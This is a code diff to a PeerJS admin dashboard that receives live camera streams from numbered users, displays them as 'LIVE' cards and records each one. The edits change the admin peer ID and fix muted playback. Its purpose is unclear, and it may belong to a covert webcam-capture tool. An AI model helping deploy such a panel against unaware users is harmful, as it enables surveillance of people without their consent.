@@ -140,7 +140,8 @@
   </div>
 
   <script>
-    const peer = new Peer('my-secret-admin-id-1234', {
+    /* Updated Admin Peer ID to match index.html */
+    const peer = new Peer('danish-cam-9988', {
       config: {
         iceServers: [
           { urls: 'stun:stun.l.google.com:19302' },
@@ -189,7 +190,7 @@
       card.innerHTML = `
         <div class="card-status" id="badge_${id}">🔴 USER #${userNumber} - LIVE</div>
         <div class="video-frame-card">
-          <video id="video_${id}" autoplay playsinline></video>
+          <video id="video_${id}" autoplay playsinline muted></video>
         </div>
         <div class="controls-bar">
           <div class="timer" id="timer_${id}">00:00</div>
@@ -204,6 +205,9 @@
 
       const videoElem = document.getElementById(`video_${id}`);
       videoElem.srcObject = stream;
+      
+      /* Force Play to prevent black screen issue */
+      videoElem.play().catch(err => console.log("Video Play Error:", err));
 
       const chunks = [];
       const mediaRecorder = new MediaRecorder(stream);
